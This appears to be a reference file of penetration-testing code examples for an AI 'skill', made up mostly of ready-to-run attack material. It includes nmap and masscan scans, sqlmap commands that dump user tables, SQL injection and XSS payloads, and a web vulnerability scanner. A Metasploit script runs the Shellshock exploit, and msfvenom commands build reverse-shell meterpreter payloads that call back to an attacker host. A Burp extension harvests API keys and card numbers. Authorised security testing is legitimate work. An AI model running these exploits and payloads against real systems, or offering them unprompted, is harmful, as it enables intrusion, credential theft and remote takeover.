# Penetration Testing Expert — Code Examples

Reference material for the `penetration-testing-expert` skill. See [SKILL.md](../SKILL.md).

## Code Examples

### Reconnaissance and Scanning

```bash
# Nmap comprehensive scan
nmap -sV -sC -O -A -p- --script=vuln -oA scan_results 192.168.1.0/24

# Fast port scan with masscan
masscan -p1-65535 192.168.1.0/24 --rate=1000 -e eth0

# Service enumeration
nmap -sV -p 80,443,22,21,3306 192.168.1.100

# DNS enumeration
dig axfr @dns-server.com example.com
nslookup -type=any example.com

# Subdomain enumeration
subfinder -d example.com -o subdomains.txt
amass enum -d example.com

# Directory brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -w wordlist.txt -u http://target.com/FUZZ

# WHOIS and DNS recon
whois example.com
dnsenum example.com
fierce --domain example.com

# SSL/TLS analysis
sslscan target.com
testssl.sh https://target.com

# Web technology fingerprinting
whatweb target.com
wappalyzer target.com
```

### SQL Injection Testing

```bash
# SQLMap automated SQL injection
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# Manual SQL injection payloads
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin' #
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT username, password FROM users--

# Time-based blind SQL injection
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--

# Error-based SQL injection
' AND 1=CONVERT(int, (SELECT @@version))--
```

### Python Penetration Testing Scripts

```python
#!/usr/bin/env python3
# port_scanner.py - Custom port scanner
import socket
import sys
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port):
    """Scan a single port on the target host."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()

        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "unknown"
            return port, service
        return None
    except:
        return None

def scan_host(host, ports, threads=100):
    """Scan multiple ports on a host using threading."""
    print(f"Scanning {host}...")
    open_ports = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(lambda p: scan_port(host, p), ports)

    for result in results:
        if result:
            port, service = result
            print(f"Port {port} open - {service}")
            open_ports.append(result)

    return open_ports

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python port_scanner.py <target_host>")
        sys.exit(1)

    target = sys.argv[1]
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080, 8443]

    results = scan_host(target, common_ports)
    print(f"\nFound {len(results)} open ports")
```

```python
#!/usr/bin/env python3
# web_vulnerability_scanner.py - Basic web vulnerability scanner
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re

class WebVulnScanner:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.visited = set()

    def crawl(self, url, depth=2):
        """Crawl website to find all pages."""
        if depth == 0 or url in self.visited:
            return []

        self.visited.add(url)
        print(f"Crawling: {url}")

        try:
            response = self.session.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')

            links = []
            for link in soup.find_all('a', href=True):
                full_url = urljoin(url, link['href'])
                if urlparse(full_url).netloc == urlparse(self.target).netloc:
                    links.append(full_url)
                    links.extend(self.crawl(full_url, depth - 1))

            return list(set(links))
        except Exception as e:
            print(f"Error crawling {url}: {e}")
            return []

    def test_sql_injection(self, url):
        """Test for SQL injection vulnerabilities."""
        sql_payloads = [
            "'", "1' OR '1'='1", "' OR '1'='1' --",
            "' UNION SELECT NULL--", "admin' --"
        ]

        vulnerabilities = []
        parsed = urlparse(url)

        if '?' not in url:
            return vulnerabilities

        for payload in sql_payloads:
            test_url = url.replace('=', f'={payload}')
            try:
                response = self.session.get(test_url, timeout=5)

                # Check for SQL error messages
                sql_errors = [
                    "SQL syntax", "mysql_fetch", "Warning: mysql",
                    "ORA-", "PostgreSQL", "SQLite", "SQLSTATE"
                ]

                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': url,
                            'payload': payload,
                            'severity': 'HIGH'
                        })
                        break
            except:
                pass

        return vulnerabilities

    def test_xss(self, url):
        """Test for Cross-Site Scripting vulnerabilities."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]

        vulnerabilities = []

        for payload in xss_payloads:
            test_url = url.replace('=', f'={payload}')
            try:
                response = self.session.get(test_url, timeout=5)

                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'XSS',
                        'url': url,
                        'payload': payload,
                        'severity': 'MEDIUM'
                    })
            except:
                pass

        return vulnerabilities

    def check_security_headers(self, url):
        """Check for missing security headers."""
        try:
            response = self.session.get(url, timeout=5)
            headers = response.headers

            required_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Content-Security-Policy': 'XSS protection',
                'X-XSS-Protection': 'XSS filter'
            }

            missing = []
            for header, description in required_headers.items():
                if header not in headers:
                    missing.append({
                        'type': 'Missing Security Header',
                        'header': header,
                        'description': description,
                        'severity': 'MEDIUM'
                    })

            return missing
        except:
            return []

    def scan(self):
        """Run comprehensive vulnerability scan."""
        print(f"Starting vulnerability scan on {self.target}\n")

        # Crawl website
        urls = self.crawl(self.target, depth=2)
        urls = list(set([self.target] + urls))

        print(f"\nFound {len(urls)} URLs to test\n")

        all_vulnerabilities = []

        # Test each URL
        for url in urls[:10]:  # Limit to 10 URLs for demo
            print(f"Testing: {url}")

            # SQL Injection tests
            all_vulnerabilities.extend(self.test_sql_injection(url))

            # XSS tests
            all_vulnerabilities.extend(self.test_xss(url))

        # Check security headers
        all_vulnerabilities.extend(self.check_security_headers(self.target))

        return all_vulnerabilities

# Usage
if __name__ == "__main__":
    scanner = WebVulnScanner("http://testphp.vulnweb.com")
    vulnerabilities = scanner.scan()

    print(f"\n{'='*60}")
    print(f"Found {len(vulnerabilities)} potential vulnerabilities")
    print('='*60)

    for vuln in vulnerabilities:
        print(f"\n[{vuln.get('severity', 'INFO')}] {vuln['type']}")
        for key, value in vuln.items():
            if key not in ['type', 'severity']:
                print(f"  {key}: {value}")
```

### Metasploit Automation

```ruby
# metasploit_automation.rc - Metasploit resource script
# Usage: msfconsole -r metasploit_automation.rc

workspace -a pentest_target
db_nmap -sV -O 192.168.1.0/24

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set THREADS 10
run

use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
check
exploit

# Generate payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > payload.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > payload.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > payload.php
```

### Burp Suite Extensions

```python
# burp_extension.py - Custom Burp Suite extension
from burp import IBurpExtender, IHttpListener
import re

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.setExtensionName("Custom Vulnerability Scanner")
        callbacks.registerHttpListener(self)

        print("Extension loaded successfully")

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            # Analyze response
            response = messageInfo.getResponse()
            analyzedResponse = self._helpers.analyzeResponse(response)

            # Check for sensitive data in response
            body = response[analyzedResponse.getBodyOffset():].tostring()

            # Look for sensitive patterns
            patterns = {
                'API Key': r'api[_-]?key[\'"\s:=]+([a-zA-Z0-9_-]+)',
                'AWS Key': r'AKIA[0-9A-Z]{16}',
                'Email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                'Credit Card': r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b'
            }

            for name, pattern in patterns.items():
                matches = re.findall(pattern, body)
                if matches:
                    print(f"[!] Found {name} in response: {matches}")
```
